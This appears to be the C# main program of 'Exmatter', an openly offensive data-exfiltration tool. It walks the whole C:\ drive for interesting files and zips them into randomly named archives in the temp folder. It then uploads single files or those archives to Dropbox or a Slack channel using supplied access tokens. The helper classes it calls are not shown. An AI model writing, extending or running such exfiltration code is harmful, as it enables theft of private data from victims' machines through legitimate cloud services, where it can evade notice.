using System;
using System.CodeDom;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;

namespace Exmatter
{
    public class Program
    {
        static async Task HandleDropboxCommand(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: Exmatter.exe dropbox <file-path>|autozip <access-token>");
                Console.WriteLine("Description: uploads to dropbox using access-token");
                Environment.Exit(1);
            }

            string uploadFilePath = args[1];
            string accessToken = args[2];

            var dbUploader = new DropboxUploader(accessToken);

            // Call the UploadFileAsync method to upload a file to Dropbox
            await dbUploader.UploadFileAsync(uploadFilePath);

        }
        static async Task HandleSlackCommand(string[] args)
        {
            if (args.Length < 4)
            {
                Console.WriteLine("Usage: Exmatter.exe slack <file-path>|autozip <API key> <slack channel name>");
                Console.WriteLine("Description: uploads to slack channel");
                Environment.Exit(1);
            }

            string uploadFilePath = args[1];
            string apiKey = args[2];
            string slackChannel = args[3];

            var slUploader = new SlackUploader(apiKey, slackChannel);

            // Call the UploadFileAsync method to upload a file to Slack
            await slUploader.UploadFileAsync(uploadFilePath);

        }

        static public List<string> HandleFileStager(string[] args)
        {
            // Help stuff
            if (args.Length < 3 && args[0].ToLower().Equals("slack"))
            {
                Console.WriteLine("Usage: Exmatter.exe slack <file-path>|autozip <API key> <slack channel name>");
                Console.WriteLine("Description: uploads to slack channel");
                Environment.Exit(1);
            }
            if (args.Length < 3 && args[0].ToLower().Equals("dropbox"))
            {
                Console.WriteLine("Usage: Exmatter.exe dropbox <file-path>|autozip <access-token>");
                Console.WriteLine("Description: uploads to dropbox using access-token");
                Environment.Exit(1);
            }

            // Write random named zip to Local\Temp\
            string tempFolderPath = Path.GetTempPath();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            string randomString = new string(Enumerable.Repeat(chars, 8)
              .Select(s => s[random.Next(s.Length)]).ToArray());
            string outputFilePath = Path.Combine(tempFolderPath, $"{randomString}.zip");


            var fileStager = new FileStager(@"C:\", outputFilePath);
            // Walks directory & makes zip
            List<string> zipFilePaths = fileStager.Go();

            return zipFilePaths;
        }



        static async Task Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: Exmatter.exe dropbox|slack <file-path>|autozip [arguments]");
                Console.WriteLine("Description: Take a guess.\n");
                Console.WriteLine("\t <file-path>   Path to single file for exfiltration.");
                Console.WriteLine("\t autozip       Will create and exfiltrate a zip of desired file types. (Be careful!)");
                Environment.Exit(1);
            }

           
            // filePath | autozip
            if (args.Length >= 2 && args[1].ToLower().Equals("autozip"))
            {
                Console.WriteLine("[+] Walking directory for interesting files... ");
                List<string> zipFilePaths = HandleFileStager(args);
                foreach (var zipFilePath in zipFilePaths)
                {
                    // replace command line switch with a file path
                    args[1] = zipFilePath;
                    // dropbox | slack
                    switch (args[0].ToLower())
                    {
                        case "dropbox":
                            await HandleDropboxCommand(args);
                            break;

                        case "slack":
                            await HandleSlackCommand(args);
                            break;

                        default:
                            Console.WriteLine($"[!] Unknown sub-command: {args[0].ToLower()}");
                            Console.WriteLine("Available sub-commands: dropbox, slack");
                            Environment.Exit(1);
                            break;
                    }
                }
            }
            else
            {
                // dropbox | slack
                switch (args[0].ToLower())
                {
                    case "dropbox":
                        await HandleDropboxCommand(args);
                        break;

                    case "slack":
                        await HandleSlackCommand(args);
                        break;

                    default:
                        Console.WriteLine($"[!] Unknown sub-command: {args[0].ToLower()}");
                        Console.WriteLine("Available sub-commands: dropbox, slack");
                        Environment.Exit(1);
                        break;
                }
            }           
        }
    }
}
